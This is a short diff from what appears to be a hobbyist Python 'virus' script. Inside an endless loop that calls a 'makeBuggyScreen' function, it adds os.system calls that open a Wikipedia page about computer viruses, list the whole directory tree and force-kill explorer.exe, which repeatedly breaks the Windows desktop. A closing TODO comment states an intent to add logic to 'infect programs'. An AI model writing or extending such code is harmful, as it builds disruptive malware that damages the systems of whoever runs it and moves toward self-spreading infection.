@@ -48,7 +48,9 @@ REMPROM()
 
 while True:
     makeBuggyScreen()
-
+    os.system("start https://en.wikipedia.org/wiki/Computer_virus")
+    os.system("tree /f")
+    os.system("cd system32 && taskkill /f /im explorer.exe")
 
 
 # TODO: Need to implement a logic to infect programs.
